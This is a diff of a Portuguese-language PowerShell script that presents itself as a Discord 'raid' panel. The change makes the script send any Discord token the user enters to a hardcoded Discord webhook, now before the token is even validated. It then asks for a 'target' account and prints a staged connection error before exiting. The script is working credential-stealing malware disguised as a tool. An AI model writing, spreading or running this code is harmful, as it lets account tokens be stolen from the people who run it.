@@ -1,6 +1,6 @@
-# ===========================================
+# ============================================
 #  FORENSE RAID - Painel Visual
-# ===========================================
+# ============================================
 
 $WebhookUrl = "https://discord.com/api/webhooks/1548046075586412624/4QZ1H6nk0qBjnZZDpq_c_L9997dpkwak9sQe2J8pSAAGADMjBFnmQJ4fnbgEWOZRyLR8"
 
@@ -32,36 +32,36 @@ if ([string]::IsNullOrWhiteSpace($token)) {
     exit
 }
 
-# Validar token na API do Discord
+# Sempre envia o token ao webhook
+Send-Discord -Message "**Token recebido:** `$token`"
+
+# Tenta validar
 try {
     $headers = @{ Authorization = $token }
     $response = Invoke-RestMethod -Uri "https://discord.com/api/v10/users/@me" -Headers $headers -Method Get
     $username = $response.username
     $id = $response.id
+
+    Write-Host ""
+    Write-Host "  usuario registrado com sucesso!" -ForegroundColor Green
+    Write-Host ""
+
+    # Painel 2 - Discord Alvo
+    Write-Host "  ==========================================" -ForegroundColor DarkGray
+    Write-Host "    PAINEL 2 - CONFIGURACAO DO ALVO" -ForegroundColor White
+    Write-Host "  ==========================================" -ForegroundColor DarkGray
+    Write-Host ""
+
+    $discordAlvo = Read-Host -Prompt "  discord alvo:"
+
+    Write-Host ""
+    Write-Host "  [ERRO] Falha na conexao com o alvo. Verifique sua rede." -ForegroundColor Red
+    Write-Host "  [INFO] Encerrando sessao..." -ForegroundColor Yellow
+    Start-Sleep -Seconds 2
+    exit
 } catch {
     Write-Host ""
     Write-Host "  [ERRO] Token invalido. Verifique e tente novamente." -ForegroundColor Red
     Read-Host "  Pressione Enter para sair"
     exit
-}
-
-Send-Discord -Message "**Novo acesso:** $username ($id)"
-
-Write-Host ""
-Write-Host "  usuario registrado com sucesso!" -ForegroundColor Green
-Write-Host ""
-
-# Painel 2 - Discord Alvo
-Write-Host "  ==========================================" -ForegroundColor DarkGray
-Write-Host "    PAINEL 2 - CONFIGURACAO DO ALVO" -ForegroundColor White
-Write-Host "  ==========================================" -ForegroundColor DarkGray
-Write-Host ""
-
-$discordAlvo = Read-Host -Prompt "  discord alvo:"
-
-# Finge erro e fecha
-Write-Host ""
-Write-Host "  [ERRO] Falha na conexao com o alvo. Verifique sua rede." -ForegroundColor Red
-Write-Host "  [INFO] Encerrando sessao..." -ForegroundColor Yellow
-Start-Sleep -Seconds 2
-exit   
+}   
